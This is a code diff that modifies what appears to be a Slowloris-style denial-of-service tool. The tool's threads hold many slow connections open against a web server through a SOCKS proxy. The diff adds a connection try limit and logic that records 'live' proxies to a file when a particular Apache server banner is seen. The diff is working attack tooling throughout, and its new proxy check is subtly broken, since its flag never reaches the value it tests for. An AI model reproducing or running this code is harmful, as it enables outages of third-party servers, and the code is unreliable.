@@ -52,6 +52,7 @@ def DefaultOptions():
         'attacklimit' : 500,            # Total number of times to attack (0 for unlimited)
         'connectionlimit' : 500,        # Total number of concurrent connections (0 for unlimited)
         'threadlimit' : 50,             # Total number of threads (0 for unlimited)
+        'trylimit' : 10,                # Total number of tries to connect (0 for unlimited)
         'connectionspeed' : 1,          # Connection speed in bytes/second
         'timebetweenthreads' : 1,       # Time delay between starting threads
         'timebetweenconnections' : 1,   # Time delay between starting connections
@@ -73,6 +74,7 @@ class Loris(threading.Thread):
     attacks = 0
     threads = 0
     sockets = 0
+    tries = 0
 
     def __init__(self):
         threading.Thread.__init__(self)
@@ -122,15 +124,20 @@ class Loris(threading.Thread):
                     self.debug.put('Socket opened, connection created.')
                     self.attacks += 1
                     self.sockets += 1
+                    self.tries = 0
                 except Exception, ex:
                     self.errors.put('Could not connect. %s.' % (ex))
-                    
+                    self.tries +=1
+                    if self.sockets == 0 and self.tries == self.options['trylimit']:
+                        self.debug.put('Try limit reached, all sockets closed. Shutting down.')
+                        self.running = False
             if self.options['timebetweenconnections'] > 0:
                 time.sleep(self.options['timebetweenconnections'])
         self.debug.put('Socket Builder finished.')
 
     def attack(self, id):
         self.debug.put('Attack thread %i started' % (id))
+        Ok = 1
         while self.running:
             (s, index) = self.connections.get()
             try:
@@ -146,6 +153,17 @@ class Loris(threading.Thread):
                         self.sockets -= 1
                     else:
                         self.connections.put((s, index))
+                        if Ok == 0:
+                            if data.find('Server: Apache/2.2.19 (Unix) mod_ssl/2.2.19 OpenSSL/0.9.8e') != -1:
+                                f = open('LiveProxy.txt', 'a')
+                                f.write(self.options['sockshost'] + ':' + str(self.options['socksport']) + '\n')
+                                f = open('Response.txt', 'w')
+                                f.write(str(data))
+                                Ok = 1
+                            else:
+                                s.close()
+                                self.debug.put('Socket closed, target do not respond properly.')
+                                self.sockets -= 1    
                 else:
                     s.close()
                     self.debug.put('Socket closed, not waiting for response.')
@@ -155,8 +173,7 @@ class Loris(threading.Thread):
                 self.debug.put('Socket closed, an exception occurred.')
                 s.close()
                 self.sockets -= 1
-
-            if self.sockets == 0 and self.attacks == self.options['attacklimit']:
+            if self.sockets == 0 and self.options['attacklimit']!= 0 and (self.attacks == self.options['attacklimit'] or self.tries > self.options['trylimit']):
                 self.debug.put('Attack limit reached, all sockets closed. Shutting down.')
                 self.running = False
             elif self.sockets > 0 and self.options['connectionspeed'] > 0:
